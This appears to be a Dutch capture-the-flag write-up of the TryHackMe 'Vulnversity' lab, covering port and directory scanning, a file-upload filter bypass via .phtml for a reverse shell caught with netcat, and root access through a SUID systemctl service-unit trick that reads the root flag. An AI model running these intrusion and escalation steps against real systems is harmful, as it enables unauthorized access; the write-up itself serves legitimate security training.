---
title: "Try Hack Me - Vulnversity"
author: Nicolas Bouquiaux
date: "2021-03-30"
subject: "Markdown"
keywords: [Markdown, Example]
...

# Vulnversity - Write-up

### Target information: 10.10.213.28

## Reconnaissance

Nmap om meer informatie over het systeem te krijgen

```shell
──(root💀kali)-[~/CTF-Write-Ups/Vulnversity]
└─# nmap -sS -sV -oN nmapinitial 10.10.114.94                                                                1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-30 02:11 EDT
Nmap scan report for 10.10.114.94
Host is up (0.071s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.44 seconds
```

Het is absurd dat de webserver draait op poort 3333. Het blijkt ook dat een proxy server wordt gehost op de target

De site blijkt een van een universiteit te zijn

![](images/vulnversity-webenum.png)


## Locating directories

Eens kijken met welke folders we allemaal te maken hebben:

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/Vulnversity]
└─# gobuster dir -u http://$ip:3333 -w /usr/share/wordlists/dirb/common.txt -x php,html                                             
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.114.94:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2021/03/30 02:21:58 Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 298]
/.hta.php             (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 293]
/.htaccess.php        (Status: 403) [Size: 302]
/.htpasswd            (Status: 403) [Size: 298]
/.htaccess.html       (Status: 403) [Size: 303]
/.htpasswd.php        (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 298]
/.htpasswd.html       (Status: 403) [Size: 303]
/css                  (Status: 301) [Size: 317] [--> http://10.10.114.94:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.114.94:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.114.94:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                     
/index.html           (Status: 200) [Size: 33014]                                     
/internal             (Status: 301) [Size: 322] [--> http://10.10.114.94:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.114.94:3333/js/]      
/server-status        (Status: 403) [Size: 302]                                         
                                                                                        
===============================================================
2021/03/30 02:22:50 Finished
===============================================================
```

Er blijkt maar één verborgen folder te zijn, namelijk 'internal'

Bij de enumeration kom je terecht op een pagina waar je bestanden kan uploaden.

![](images/vulnversity-internalenum.png)


## Getting a shell


Nu moeten we een revershe shell krijgen door een .php bestand te uploaden. Het blokkeert bestanden met de .php-extensie dus moeten we het als .phtml uploaden.

![](images/vulnversity-succes.png)


Nu we een shell-connectie hebben, moeten we een manier zien te vinden om onze privilege escalaten.

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/Vulnversity]
└─# nc -lvp 9999                             
listening on [any] 9999 ...
10.10.114.94: inverse host lookup failed: Unknown host
connect to [10.9.0.187] from (UNKNOWN) [10.10.114.94] 42346
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 02:35:42 up 29 min,  0 users,  load average: 0.00, 0.00, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```

Nadat we een interactieve shell creëren, kunnen we de locatie van de user-flag opvragen met de betreffende inhoud:

```shell
www-data@vulnuniversity:/$ find / -name user.txt 2>/dev/null 
find / -name user.txt 2>/dev/null
/home/bill/user.txt
www-data@vulnuniversity:/$ cat /home/bill/user.txt 
cat /home/bill/user.txt 
[REDACTED]
www-data@vulnuniversity:/$ 
```

## Privilege escalation

De volgende binaries werden gevonden met SUID-permissies:

```shell
www-data@vulnuniversity:/$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

/bin/systemctl lijkt een binary te zijn dat we kunnen manipuleren om de inhoud van de root-flag te schrijven naar een bestand:

```
www-data@vulnuniversity:/$ TF=$(mktemp).service
TF=$(mktemp).service
www-data@vulnuniversity:/$ echo '[Service]
echo '[Service]
> Type=oneshot
Type=oneshot
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
[Install]
> WantedBy=multi-user.target' > $TF
WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/$ /bin/systemctl link $TF
/bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.AbqA4zl9Fe.service to /tmp/tmp.AbqA4zl9Fe.service.
www-data@vulnuniversity:/$ enable --now $TF
enable --now $TF
bash: enable: --: invalid option
enable: usage: enable [-a] [-dnps] [-f filename] [name ...]
www-data@vulnuniversity:/$ /bin/systemctl enable --now $TF
/bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.AbqA4zl9Fe.service to /tmp/tmp.AbqA4zl9Fe.service.
www-data@vulnuniversity:/$ cat /tmp/output
cat /tmp/output
[REDACTED]
www-data@vulnuniversity:/$  
```